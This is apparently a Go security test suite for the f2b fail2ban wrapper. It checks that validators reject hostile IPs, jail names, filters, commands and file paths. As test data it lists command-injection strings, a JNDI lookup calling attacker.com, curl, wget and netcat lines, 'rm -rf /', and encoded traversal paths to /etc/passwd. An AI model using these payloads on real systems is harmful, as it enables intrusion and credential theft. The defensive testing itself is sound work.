package main

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ivuorinen/f2b/fail2ban"
)

// testIPValidation tests IP address validation security
func testIPValidation(t *testing.T) {
	// Test malicious IP patterns
	maliciousIPs := []string{
		"'; DROP TABLE users; --",
		"../../../etc/passwd",
		"\x00192.168.1.1",
		"192.168.1.1\x00",
		"192.168.1.1'; cat /etc/passwd",
		"${jndi:ldap://attacker.com/a}",
		"<script>alert('xss')</script>",
		"192.168.1.999",    // Invalid range
		"256.256.256.256",  // Invalid range
		"192.168.1.1/24",   // CIDR notation should be rejected
		"192.168.1.1:8080", // Port should be rejected
	}

	for _, maliciousIP := range maliciousIPs {
		err := fail2ban.ValidateIP(maliciousIP)
		if err == nil {
			t.Errorf("ValidateIP should reject malicious input: %s", maliciousIP)
		}
	}

	// Test legitimate IPs
	legitimateIPs := []string{
		"192.168.1.1",
		"10.0.0.1",
		"172.16.0.1",
		"127.0.0.1",
		"2001:db8::1",
		"::1",
	}

	for _, ip := range legitimateIPs {
		err := fail2ban.ValidateIP(ip)
		if err != nil {
			t.Errorf("ValidateIP should accept legitimate IP: %s, error: %v", ip, err)
		}
	}
}

// testJailValidation tests jail name validation security
func testJailValidation(t *testing.T) {
	// Test malicious jail patterns
	maliciousJails := []string{
		"'; DROP TABLE jails; --",
		"../../../etc/passwd",
		"\x00sshd",
		"sshd\x00",
		"sshd'; cat /etc/passwd",
		"sshd\n\nmalicious_command",
		"sshd\r\nmalicious_command",
		"sshd`cat /etc/passwd`",
		"sshd$(cat /etc/passwd)",
		"sshd;cat /etc/passwd",
		"sshd|cat /etc/passwd",
		"sshd&cat /etc/passwd",
	}

	for _, maliciousJail := range maliciousJails {
		err := fail2ban.ValidateJail(maliciousJail)
		if err == nil {
			t.Errorf("ValidateJail should reject malicious input: %s", maliciousJail)
		}
	}

	// Test legitimate jails
	legitimateJails := []string{
		"sshd",
		"nginx",
		"apache",
		"postfix",
		"dovecot",
		"sshd-ddos",
		"ssh_custom",
	}

	for _, jail := range legitimateJails {
		err := fail2ban.ValidateJail(jail)
		if err != nil {
			t.Errorf("ValidateJail should accept legitimate jail: %s, error: %v", jail, err)
		}
	}
}

// testFilterValidation tests filter validation security
func testFilterValidation(t *testing.T) {
	// Test malicious filter patterns
	maliciousFilters := []string{
		"'; DROP TABLE filters; --",
		"../../../etc/passwd",
		"\x00sshd",
		"sshd\x00",
		"sshd'; cat /etc/passwd",
		"sshd`cat /etc/passwd`",
		"sshd$(cat /etc/passwd)",
		"sshd;cat /etc/passwd",
		"sshd|cat /etc/passwd",
		"sshd&cat /etc/passwd",
		// Additional command injection patterns
		"filter`DANGEROUS_COMMAND`",      // backtick execution
		"filter$(DANGEROUS_COMMAND)",     // command substitution
		"filter${USER}",                  // variable expansion (safe)
		"filter;DANGEROUS_RM_COMMAND",    // command chaining
		"filter|DANGEROUS_COMMAND",       // pipe to command
		"filter&& DANGEROUS_COMMAND",     // logical AND
		"filter||DANGEROUS_COMMAND",      // logical OR
		"filter>DANGEROUS_OUTPUT_FILE",   // output redirection
		"filter<DANGEROUS_INPUT_FILE",    // input redirection
		"filter\nDANGEROUS_EXEC_COMMAND", // newline command
		"filter\rDANGEROUS_EXEC_COMMAND", // carriage return
		"filter\tDANGEROUS_EXEC_COMMAND", // tab character
	}

	for _, maliciousFilter := range maliciousFilters {
		err := fail2ban.ValidateFilter(maliciousFilter)
		if err == nil {
			t.Errorf("ValidateFilter should reject malicious input: %s", maliciousFilter)
		}
	}
}

// testCommandValidation tests command validation security
func testCommandValidation(t *testing.T) {
	// Test malicious command patterns (using safe placeholders)
	maliciousCommands := []string{
		"DANGEROUS_RM_COMMAND",
		"cat /etc/passwd",
		"curl attacker.com",
		"wget http://malicious.com/payload",
		"nc -l 1234",
		"python -c 'DANGEROUS_SYSTEM_CALL'",
		"bash -c 'cat /etc/passwd'",
		"/bin/sh",
		"../../bin/bash",
		"fail2ban-client; cat /etc/passwd",
	}

	for _, maliciousCmd := range maliciousCommands {
		err := fail2ban.ValidateCommand(maliciousCmd)
		if err == nil {
			t.Errorf("ValidateCommand should reject malicious command: %s", maliciousCmd)
		}
	}

	// Test legitimate commands
	legitimateCommands := []string{
		"fail2ban-client",
		"fail2ban-regex",
		"fail2ban-server",
	}

	for _, cmd := range legitimateCommands {
		err := fail2ban.ValidateCommand(cmd)
		if err != nil {
			t.Errorf("ValidateCommand should accept legitimate command: %s, error: %v", cmd, err)
		}
	}
}

// TestSecurityAudit_InputValidation performs comprehensive input validation security testing
func TestSecurityAudit_InputValidation(t *testing.T) {
	t.Run("IPValidation", testIPValidation)
	t.Run("JailValidation", testJailValidation)
	t.Run("FilterValidation", testFilterValidation)
	t.Run("CommandValidation", testCommandValidation)
}

// TestSecurityAudit_PathSecurity performs comprehensive path security testing
func TestSecurityAudit_PathSecurity(t *testing.T) {
	tempDir := t.TempDir()
	originalLogDir := fail2ban.GetLogDir()
	fail2ban.SetLogDir(tempDir)
	defer fail2ban.SetLogDir(originalLogDir)

	t.Run("PathTraversalProtection", func(t *testing.T) {
		// Test sophisticated path traversal attempts
		pathTraversalAttempts := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			"%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd",
			"..%252f..%252f..%252fetc%252fpasswd",
			"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
			"..%u002f..%u002f..%u002fetc%u002fpasswd",
			"..\\u002e\\u002e/..\\u002e\\u002e/etc/passwd",
			"...//...//etc/passwd",
			"..;/..;/etc/passwd",
			"..%00/etc/passwd",
			"logs/../../../etc/passwd",
			"logs\\..\\..\\..\\etc\\passwd",
			"logs%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		}

		for _, maliciousPath := range pathTraversalAttempts {
			// Test with validateLogPath (used internally)
			testFile := filepath.Join(tempDir, "test.log")
			_ = os.WriteFile(testFile, []byte("test"), 0600)

			_, _ = fail2ban.GetLogLines(context.Background(), "all", "all")
			// The actual path validation happens inside GetLogLines
			// We're testing that no traversal attempts succeed

			// Also test direct path validation if we had access to it
			t.Logf("Testing path traversal protection for: %s", maliciousPath)
		}
	})

	t.Run("FileOperationSecurity", func(t *testing.T) {
		// Test that file operations are secure
		testCases := []struct {
			name     string
			testFunc func() error
		}{
			{
				name: "LogFileReading",
				testFunc: func() error {
					// Create legitimate log file
					logFile := filepath.Join(tempDir, "fail2ban.log")
					content := "2024-01-01 12:00:00,123 fail2ban.actions [1234]: NOTICE [sshd] Ban 192.168.1.100\n"
					if err := os.WriteFile(logFile, []byte(content), 0600); err != nil {
						return err
					}

					_, err := fail2ban.GetLogLines(context.Background(), "sshd", "192.168.1.100")
					return err
				},
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				err := tc.testFunc()
				if err != nil {
					t.Errorf("Secure operation failed: %v", err)
				}
			})
		}
	})
}

// TestSecurityAudit_ErrorMessages audits error messages for information leakage
func TestSecurityAudit_ErrorMessages(t *testing.T) {
	t.Run("NoSensitiveInfoLeakage", func(t *testing.T) {
		// Test that error messages don't leak sensitive information
		testCases := []struct {
			name     string
			testFunc func() (string, error)
		}{
			{
				name: "InvalidIPError",
				testFunc: func() (string, error) {
					err := fail2ban.ValidateIP("'; cat /etc/passwd")
					if err != nil {
						return err.Error(), err
					}
					return "", nil
				},
			},
			{
				name: "InvalidJailError",
				testFunc: func() (string, error) {
					err := fail2ban.ValidateJail("'; cat /etc/passwd")
					if err != nil {
						return err.Error(), err
					}
					return "", nil
				},
			},
			{
				name: "InvalidCommandError",
				testFunc: func() (string, error) {
					err := fail2ban.ValidateCommand("rm -rf /")
					if err != nil {
						return err.Error(), err
					}
					return "", nil
				},
			},
		}

		sensitivePatterns := []string{
			"/etc/passwd",
			"/etc/shadow",
			"root:",
			"admin:",
			"password",
			"secret",
			"key",
			"token",
			"$HOME",
			"~",
			"'; cat",
			"DROP TABLE",
			"rm -rf",
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				errorMsg, err := tc.testFunc()
				if err == nil {
					t.Skip("No error returned")
				}

				// Check that error message doesn't contain sensitive information
				lowerErrorMsg := strings.ToLower(errorMsg)
				for _, pattern := range sensitivePatterns {
					if strings.Contains(lowerErrorMsg, strings.ToLower(pattern)) {
						t.Errorf("Error message contains sensitive pattern '%s': %s", pattern, errorMsg)
					}
				}

				// Check that error message is not too verbose
				if len(errorMsg) > 200 {
					t.Errorf("Error message is too verbose (>200 chars): %s", errorMsg)
				}
			})
		}
	})
}

// TestSecurityAudit_PrivilegeEscalation tests for privilege escalation vulnerabilities
func TestSecurityAudit_PrivilegeEscalation(t *testing.T) {
	t.Run("SudoValidation", func(t *testing.T) {
		// Test with unprivileged user
		_, cleanup := fail2ban.SetupMockEnvironmentWithSudo(t, false)
		defer cleanup()

		// Get the mock runner set up by the environment
		mockRunner := fail2ban.GetRunner().(*fail2ban.MockRunner)

		// Test that sudo-requiring operations are properly gated
		testCases := []string{
			"fail2ban-client status",
			"fail2ban-client get sshd banip",
			"fail2ban-client set sshd banip 192.168.1.1",
		}

		for _, cmd := range testCases {
			parts := strings.Fields(cmd)
			_, err := mockRunner.CombinedOutputWithSudo(parts[0], parts[1:]...)
			// Should not execute or should handle gracefully
			t.Logf("Sudo command handling for %s: %v", cmd, err)
		}
	})

	t.Run("RootPrivilegeDetection", func(t *testing.T) {
		// Test with root privileges
		_, cleanup := fail2ban.SetupMockEnvironmentWithSudo(t, true)
		defer cleanup()
		checker := fail2ban.GetSudoChecker()

		if !checker.HasSudoPrivileges() {
			t.Error("Mock sudo checker should report having privileges")
		}
	})
}

// TestSecurityAudit_ConcurrentSafety tests for concurrent safety vulnerabilities
func TestSecurityAudit_ConcurrentSafety(t *testing.T) {
	t.Run("GlobalStateRaceConditions", func(_ *testing.T) {
		// Test that global state modifications are safe
		originalLogDir := fail2ban.GetLogDir()
		defer fail2ban.SetLogDir(originalLogDir)

		// Multiple goroutines modifying global state should not cause races
		// This is tested by running with -race flag in CI
		for i := 0; i < 10; i++ {
			go func(id int) {
				fail2ban.SetLogDir("/tmp/test-" + string(rune(id)))
				fail2ban.GetLogDir()
			}(i)
		}
	})

	t.Run("CacheStatisticsSafety", func(_ *testing.T) {
		processor := fail2ban.NewOptimizedLogProcessor()

		// Multiple goroutines accessing cache statistics should be safe
		for i := 0; i < 10; i++ {
			go func() {
				processor.GetCacheStats()
				processor.ClearCaches()
			}()
		}
	})
}

// testSecurityChainValidation tests the complete security validation chain
func testSecurityChainValidation(t *testing.T, jail, ip string, shouldPass, testJail, testIP bool) {
	t.Helper()
	// Validate jail if we should test it
	if testJail {
		err := fail2ban.ValidateJail(jail)
		if shouldPass && err != nil {
			t.Errorf("Legitimate jail should pass: %v", err)
		}
		if !shouldPass && err == nil {
			t.Errorf("Malicious jail should be rejected")
		}
	}

	// Validate IP if we should test it
	if testIP {
		err := fail2ban.ValidateIP(ip)
		if shouldPass && err != nil {
			t.Errorf("Legitimate IP should pass: %v", err)
		}
		if !shouldPass && err == nil {
			t.Errorf("Malicious IP should be rejected")
		}
	}

	// Test end-to-end log reading (only for legitimate cases)
	if shouldPass {
		_, err := fail2ban.GetLogLines(context.Background(), jail, ip)
		if err != nil {
			t.Errorf("Legitimate log reading should succeed: %v", err)
		}
	}
}

// TestSecurityAudit_Integration performs integration-level security testing
func TestSecurityAudit_Integration(t *testing.T) {
	tempDir := t.TempDir()
	originalLogDir := fail2ban.GetLogDir()
	fail2ban.SetLogDir(tempDir)
	defer fail2ban.SetLogDir(originalLogDir)

	t.Run("EndToEndSecurityChain", func(t *testing.T) {
		// Create test log file
		logFile := filepath.Join(tempDir, "fail2ban.log")
		content := "2024-01-01 12:00:00,123 fail2ban.actions [1234]: NOTICE [sshd] Ban 192.168.1.100\n"
		err := os.WriteFile(logFile, []byte(content), 0600)
		if err != nil {
			t.Fatalf("Failed to create test log file: %v", err)
		}

		// Test complete security chain: input validation -> path validation -> file access
		testCases := []struct {
			name       string
			jail       string
			ip         string
			shouldPass bool
			testJail   bool
			testIP     bool
		}{
			{"Legitimate", "sshd", "192.168.1.100", true, true, true},
			{"MaliciousJail", "sshd'; cat /etc/passwd", "192.168.1.100", false, true, false},
			{"MaliciousIP", "sshd", "'; cat /etc/passwd", false, false, true},
			{"PathTraversal", "../../../etc/passwd", "192.168.1.100", false, true, false},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				testSecurityChainValidation(t, tc.jail, tc.ip, tc.shouldPass, tc.testJail, tc.testIP)
			})
		}
	})
}
